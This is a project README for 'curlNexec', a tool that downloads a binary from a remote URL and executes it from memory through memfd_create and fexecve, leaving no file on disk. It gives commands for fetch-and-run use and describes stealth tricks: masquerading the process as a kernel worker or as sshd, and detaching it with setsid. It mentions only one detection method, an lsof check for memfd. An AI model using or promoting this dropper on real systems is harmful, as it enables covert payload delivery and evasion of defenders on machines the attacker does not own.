<h1 align=center> curlNexec </h1>

<div align="center">
<code>👋 Certainly useful , mainly for fun, rougly inspired by 0x00 <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">article</a></code>
</div>

## Short story

`curlNexec` enable us to execute a remote binary on a local machine in one step

 - simple usage `curlNexec <binary_url>`
 - execute binary with specified program name: `curlNexec -n /usr/sbin/sshd <binary_raw_url>`
 - detach program execution from `tty`: ` setsid curlNExec [...]` 

![demo](https://github.com/ariary/curlNexec/blob/main/img/curlNexec.gif)

## Stealthiness story 

### memfd_create
The remote binary file is stored locally using `memfd_create` syscall, which store it within a _memory disk_ which is not mapped into the file system (*ie* you can't find it using `ls`).

### fexecve
Then we execute it using `fexecve` syscall (as it is currently not provided by `syscall` golang library we implem it). 

> With `fexecve` , we could but we reference the program to run using a
> file descriptor, instead of the full path.


### other skill for stealthiness

Although not present on the memory disk, the running program can still be detected using `ps` command for example. 

 1. Cover the tracks with a fake program name
 
`curlNexec --name <fake_name> <binary_raw_url>` by default the name is `[kworker/u:0]` 
 2. Detach from tty to map behaviour of deamon process
 
`setsid curlNexec <binary_raw_url>`. *WIP call `setsid` from code*

### Caveats
You could still be detected with:
```
$ lsof | grep memfd
```
